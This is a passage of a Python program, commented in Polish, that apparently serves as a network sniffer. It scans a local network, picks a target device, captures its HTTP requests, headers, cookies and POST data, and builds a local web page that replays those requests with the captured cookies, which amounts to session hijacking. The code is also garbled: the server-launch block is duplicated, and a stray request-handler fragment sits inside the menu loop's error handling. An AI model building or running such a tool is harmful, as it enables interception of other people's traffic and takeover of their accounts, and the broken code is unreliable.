                                        contentTitle.textContent = 'Treść odpowiedzi';
                                        contentTitle.style.fontWeight = 'bold';
                                        requestBlock.appendChild(contentTitle);

                                        // Kontener z przyciskami
                                        const buttonsDiv = document.createElement('div');
                                        buttonsDiv.className = 'content-buttons';

                                        // Przycisk Kod
                                        const codeBtn = document.createElement('button');
                                        codeBtn.textContent = 'Kod';

                                        // Przycisk Podgląd
                                        const previewBtn = document.createElement('button');
                                        previewBtn.textContent = 'Podgląd';

                                        // Przycisk Pełna strona
                                        const fullPageBtn = document.createElement('button');
                                        fullPageBtn.textContent = 'Pełna strona';

                                        // Kontener na treść
                                        const contentDiv = document.createElement('div');
                                        contentDiv.className = 'content-container';

                                        // Domyślnie pokaż kod
                                        const contentPre = document.createElement('pre');
                                        contentPre.textContent = response.content;
                                        contentDiv.appendChild(contentPre);

                                        // Obsługa przycisku Kod
                                        codeBtn.onclick = () => {
                                            contentDiv.innerHTML = '';
                                            contentDiv.appendChild(contentPre);
                                        };

                                        // Obsługa przycisku Podgląd
                                        previewBtn.onclick = () => {
                                            contentDiv.innerHTML = '';
                                            const iframe = document.createElement('iframe');
                                            iframe.srcdoc = response.content;
                                            iframe.style.width = '100%';
                                            iframe.style.height = '600px';
                                            contentDiv.appendChild(iframe);
                                        };

                                        // Obsługa przycisku Pełna strona
                                        fullPageBtn.onclick = () => {
                                            contentDiv.innerHTML = '';
                                            const iframe = document.createElement('iframe');
                                            iframe.srcdoc = response.content;
                                            iframe.style.width = '100%';
                                            iframe.style.height = '800px';
                                            contentDiv.appendChild(iframe);
                                        };

                                        // Dodaj przyciski
                                        buttonsDiv.appendChild(codeBtn);
                                        buttonsDiv.appendChild(previewBtn);
                                        buttonsDiv.appendChild(fullPageBtn);
                                        requestBlock.appendChild(buttonsDiv);
                                        requestBlock.appendChild(contentDiv);
                                    }
                                });
                            }

                            detailsPanel.appendChild(requestBlock);
                        });
                    }
                })
                .catch(error => {
                    console.error('Błąd podczas ładowania danych:', error);
                    document.getElementById('detailsPanel').innerHTML = 
                        `<p>Nie udało się załadować danych: ${error.message}</p>`;
                });
        </script>
    </body>
    </html>
                ''')

            # Uruchom serwer HTTP
            handler = SessionHandler
            with socketserver.TCPServer(("", 8000), handler) as httpd:
                print("Serwer uruchomiony na http://localhost:8000")
                print("Otwórz przeglądarkę i przejdź do adresu: http://localhost:8000")
                print("Naciśnij Ctrl+C, aby zatrzymać serwer")
                try:
                    # Otwórz przeglądarkę
                    try:
                        import webbrowser
                        webbrowser.open("http://localhost:8000")
                    except Exception as e:
                        print(f"Nie udało się automatycznie otworzyć przeglądarki: {e}")

                    # Uruchom serwer
                    httpd.serve_forever()
                except KeyboardInterrupt:
                    print("\nZatrzymywanie serwera...")
                except Exception as e:
                    print(f"\nBłąd podczas działania serwera: {e}")
                finally:
                    try:
                        httpd.shutdown()
                    except:
                        pass
                    # Usuń pliki tymczasowe
                    for temp_file in ['temp_session_data.json', 'session_browser.html']:
                        try:
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                        except Exception as e:
                            print(f"Nie udało się usunąć pliku {temp_file}: {e}")
                    print("Serwer zatrzymany.")

            return True

        except Exception as e:
            print(f"Błąd podczas uruchamiania przeglądarki sesji: {e}")
            import traceback
            traceback.print_exc()
            return False

    def load_captured_data(self, filename):
        """Wczytuje przechwycone dane z pliku"""
        try:
            # Sprawdź czy plik istnieje
            if not os.path.isfile(filename):
                print(f"Błąd: Plik {filename} nie istnieje.")
                return False

            with open(filename, 'rb') as f:
                loaded_data = pickle.load(f)

            # Sprawdź czy dane mają prawidłowy format
            if not isinstance(loaded_data, dict):
                print(f"Błąd: Nieprawidłowy format danych w pliku {filename}.")
                return False

            self.captured_data = loaded_data

            # Wyświetl statystyki wczytanych danych
            url_count = len(self.captured_data)
            request_count = sum(len(requests) for requests in self.captured_data.values())

            print(f"Dane wczytane z pliku: {filename}")
            print(f"Liczba unikalnych URL: {url_count}")
            print(f"Łączna liczba żądań: {request_count}")

            return True
        except Exception as e:
            print(f"Błąd podczas wczytywania danych: {e}")
            print("Upewnij się, że plik jest prawidłowym plikiem danych wygenerowanym przez ten program.")
            return False

    def run(self):
        """Główna funkcja programu"""
        print("=== Narzędzie do przechwytywania ruchu sieciowego ===")

        while True:
            try:
                print("\nMenu:")
                print("1. Wybierz interfejs sieciowy")
                print("2. Skanuj sieć")
                print("3. Pokaż znalezione urządzenia")
                print("4. Rozpocznij przechwytywanie ruchu")
                print("5. Wczytaj dane z pliku")
                print("6. Uruchom przeglądarkę sesji")
                print("0. Wyjdź")

                try:
                    choice = input("\nWybierz opcję: ").strip()
                except (UnicodeDecodeError, KeyboardInterrupt):
                    print("\nNieprawidłowe wejście. Spróbuj ponownie.")
                    continue

                if choice == "1":
                    self.show_interfaces()
                elif choice == "2":
                    if self.selected_interface:
                        success = self.scan_network()
                        if success and self.devices:
                            self.show_devices()
                    else:
                        print("Najpierw wybierz interfejs sieciowy.")
                elif choice == "3":
                    if self.devices:
                        self.show_devices()
                    else:
                        print("Najpierw przeprowadź skanowanie sieci.")
                elif choice == "4":
                    if self.selected_device:
                        self.start_sniffing()
                    else:
                        print("Najpierw wybierz urządzenie.")
                elif choice == "5":
                    try:
                        filename = input("Podaj nazwę pliku: ").strip()
                        if filename:
                            self.load_captured_data(filename)
                        else:
                            print("Nie podano nazwy pliku.")
                    except (UnicodeDecodeError, KeyboardInterrupt):
                        print("\nNieprawidłowe wejście. Operacja anulowana.")
                elif choice == "6":
                    if self.captured_data:
                        self.start_session_browser()
                    else:
                        print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
                elif choice == "0":
                    print("Wyjście z programu.")
                    break
                else:
                    print("Nieprawidłowy wybór. Wybierz opcję od 0 do 6.")
            except KeyboardInterrupt:
                print("\n\nPrzerwano działanie. Czy chcesz wyjść z programu? (t/n): ", end="")
                try:
                    confirm = input().strip().lower()
                    if confirm == 't' or confirm == 'tak':
                        print("Wyjście z programu.")
                        break
                    else:
                        print("Kontynuowanie pracy.")
                except:
                    print("\nWyjście z programu.")
                    break
            except Exception as e:
                print(f"\nWystąpił nieoczekiwany błąd: {e}")
                print("Kontynuowanie pracy...")

                if self.path == '/':
                    self.path = '/session_browser.html'
                elif self.path == '/data':
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    with open('temp_session_data.json', 'rb') as f:
                        self.wfile.write(f.read())
                    return

                return http.server.SimpleHTTPRequestHandler.do_GET(self)

        # Utwórz plik HTML dla przeglądarki sesji
        with open('session_browser.html', 'w') as f:
            f.write('''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Przeglądarka sesji</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        h1 { color: #333; }
        .url-list { width: 30%; float: left; overflow-y: auto; height: 600px; }
        .url-details { width: 65%; float: right; border-left: 1px solid #ccc; padding-left: 20px; height: 600px; overflow-y: auto; }
        .url-item { padding: 8px; cursor: pointer; border-bottom: 1px solid #eee; }
        .url-item:hover { background-color: #f5f5f5; }
        .selected { background-color: #e0e0e0; }
        .request-details { margin-top: 20px; border: 1px solid #ddd; padding: 10px; border-radius: 5px; }
        .cookie-table { width: 100%; border-collapse: collapse; }
        .cookie-table th, .cookie-table td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        .cookie-table th { background-color: #f2f2f2; }
        .headers-table { width: 100%; border-collapse: collapse; }
        .headers-table th, .headers-table td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        .headers-table th { background-color: #f2f2f2; }
        .replay-btn { background-color: #4CAF50; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; }
        .replay-btn:hover { background-color: #45a049; }
    </style>
</head>
<body>
    <h1>Przeglądarka sesji</h1>

    <div class="url-list" id="urlList">
        <h2>Zarejestrowane URL</h2>
        <div id="urls"></div>
    </div>

    <div class="url-details" id="urlDetails">
        <h2>Szczegóły żądania</h2>
        <div id="details">Wybierz URL z listy po lewej stronie</div>
    </div>

    <script>
        // Pobierz dane
        fetch('/data')
            .then(response => response.json())
            .then(data => {
                const urlsContainer = document.getElementById('urls');
                const detailsContainer = document.getElementById('details');

                // Wyświetl listę URL
                Object.keys(data).forEach(url => {
                    const div = document.createElement('div');
                    div.className = 'url-item';
                    div.textContent = url;
                    div.onclick = () => {
                        // Usuń poprzednie zaznaczenie
                        document.querySelectorAll('.url-item').forEach(el => el.classList.remove('selected'));
                        div.classList.add('selected');

                        // Wyświetl szczegóły żądań
                        const requests = data[url];
                        let detailsHtml = `<h3>URL: ${url}</h3>`;

                        requests.forEach((req, index) => {
                            detailsHtml += `
                            <div class="request-details">
                                <h4>Żądanie #${index + 1} (${req.timestamp})</h4>
                                <p><strong>Metoda:</strong> ${req.method}</p>

                                <h5>Nagłówki:</h5>
                                <table class="headers-table">
                                    <tr>
                                        <th>Nagłówek</th>
                                        <th>Wartość</th>
                                    </tr>
                            `;

                            for (const [header, value] of Object.entries(req.headers)) {
                                detailsHtml += `
                                    <tr>
                                        <td>${header}</td>
                                        <td>${value}</td>
                                    </tr>
                                `;
                            }

                            detailsHtml += `</table>`;

                            if (Object.keys(req.cookies).length > 0) {
                                detailsHtml += `
                                <h5>Ciasteczka:</h5>
                                <table class="cookie-table">
                                    <tr>
                                        <th>Nazwa</th>
                                        <th>Wartość</th>
                                    </tr>
                                `;

                                for (const [name, value] of Object.entries(req.cookies)) {
                                    detailsHtml += `
                                        <tr>
                                            <td>${name}</td>
                                            <td>${value}</td>
                                        </tr>
                                    `;
                                }

                                detailsHtml += `</table>`;
                            }

                            if (req.post_data) {
                                detailsHtml += `
                                <h5>Dane POST:</h5>
                                <pre>${req.post_data}</pre>
                                `;
                            }

                            detailsHtml += `
                                <button class="replay-btn" onclick="replayRequest('${url}', ${index})">Odtwórz żądanie</button>
                            </div>
                            `;
                        });

                        detailsContainer.innerHTML = detailsHtml;
                    };

                    urlsContainer.appendChild(div);
                });
            })
            .catch(error => {
                console.error('Błąd podczas pobierania danych:', error);
                document.getElementById('details').innerHTML = `<p>Błąd podczas pobierania danych: ${error.message}</p>`;
            });

        // Funkcja do odtwarzania żądania
        function replayRequest(url, index) {
    fetch('/data')
        .then(response => response.json())
        .then(data => {
            const request = data[url][index];

            // Utwórz iframe aby symulować przeglądarkę
            const iframe = document.createElement('iframe');
            iframe.style.width = '100%';
            iframe.style.height = '600px';
            iframe.style.border = '1px solid #ccc';

            // Dodaj iframe do strony
            const detailsDiv = document.querySelector(`#details .request-details:nth-child(${index + 2})`);
            detailsDiv.appendChild(iframe);

            // Przygotuj pełny adres URL
            const fullUrl = url.startsWith('http') ? url : `http://${url}`;

            // Przygotuj zawartość dokumentu HTML w iframe
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            
            // Funkcja do wysyłania żądania
            function sendRequest() {
                // Utwórz formularz do wysłania żądania
                const form = iframeDoc.createElement('form');
                form.method = request.method || 'GET';
                form.action = fullUrl;
                form.target = '_self';
                form.enctype = 'application/x-www-form-urlencoded';

                // Dodaj ciasteczka
                if (request.cookies && Object.keys(request.cookies).length > 0) {
                    const cookieScript = iframeDoc.createElement('script');
                    let cookieCode = '';
                    for (const [name, value] of Object.entries(request.cookies)) {
                        cookieCode += `document.cookie = "${name}=${value}; path=/; domain=${new URL(fullUrl).hostname}";`;
                    }
                    cookieScript.textContent = cookieCode;
                    iframeDoc.head.appendChild(cookieScript);
                }

                // Dodaj dane POST jeśli istnieją
                if (request.method === 'POST' && request.post_data) {
                    try {
                        const dataParams = new URLSearchParams(request.post_data);
                        dataParams.forEach((value, key) => {
                            const input = iframeDoc.createElement('input');
                            input.type = 'hidden';
                            input.name = key;
                            input.value = value;
                            form.appendChild(input);
                        });
                    } catch (error) {
                        console.error('Błąd podczas przetwarzania danych POST:', error);
                        // Dodaj surowe dane POST jako jeden parametr
                        const input = iframeDoc.createElement('input');
                        input.type = 'hidden';
                        input.name = 'rawPostData';
                        input.value = request.post_data;
                        form.appendChild(input);
                    }
                }

                // Dodaj nagłówki niestandardowe jako meta tagi
                if (request.headers) {
                    for (const [header, value] of Object.entries(request.headers)) {
                        const metaTag = iframeDoc.createElement('meta');
                        metaTag.name = `x-custom-header-${header.toLowerCase()}`;
                        metaTag.content = value;
                        iframeDoc.head.appendChild(metaTag);
                    }
                }

                // Otwórz dokument do zapisu
                iframeDoc.open();
                
                // Wygeneruj podstawowy dokument HTML
                const htmlContent = `
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Odtwarzanie żądania</title>
                    <meta charset="UTF-8">
                    <style>
                        body { font-family: Arial, sans-serif; margin: 20px; }
                        .request-info { 
                            background-color: #f4f4f4; 
                            padding: 10px; 
                            margin-bottom: 20px; 
                            border: 1px solid #ddd; 
                        }
                    </style>
                </head>
                <body>
                    <div class="request-info">
                        <h2>Odtwarzanie żądania</h2>
                        <p><strong>URL:</strong> ${fullUrl}</p>
                        <p><strong>Metoda:</strong> ${request.method || 'GET'}</p>
                        <p><strong>Timestamp:</strong> ${request.timestamp}</p>
                    </div>
                    
                    <!-- Formularz do automatycznego wysłania -->
                    ${form.outerHTML}

                    <script>
                        // Automatyczne wysłanie formularza
                        document.forms[0].submit();
                    </script>
                </body>
                </html>
                `;

                // Wpisz zawartość i zamknij dokument
                iframeDoc.write(htmlContent);
                iframeDoc.close();
            }

            // Wywołaj funkcję wysłania żądania
            sendRequest();
        })
        .catch(error => {
            console.error('Błąd podczas odtwarzania żądania:', error);
            alert(`Błąd podczas odtwarzania żądania: ${error.message}`);
        });
        }
    </script>
</body>
</html>
            ''')

        # Uruchom serwer HTTP
        handler = SessionHandler
        with socketserver.TCPServer(("", 8000), handler) as httpd:
            print("Serwer uruchomiony na http://localhost:8000")
            try:
                # Otwórz przeglądarkę
                import webbrowser
                webbrowser.open("http://localhost:8000")

                # Uruchom serwer
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\nZatrzymywanie serwera...")
                httpd.shutdown()
                # Usuń pliki tymczasowe
                if os.path.exists('temp_session_data.json'):
                    os.remove('temp_session_data.json')
                if os.path.exists('session_browser.html'):
                    os.remove('session_browser.html')
                print("Serwer zatrzymany.")


# Uruchomienie programu
if __name__ == "__main__":
    try:
        print("Uruchamianie narzędzia do przechwytywania ruchu sieciowego...")
        sniffer = NetworkSniffer()
        sniffer.run()
    except KeyboardInterrupt:
        print("\nPrzerwano działanie programu.")
    except Exception as e:
        print(f"\nWystąpił nieoczekiwany błąd: {e}")
    finally:
        print("Wyjście z programu.")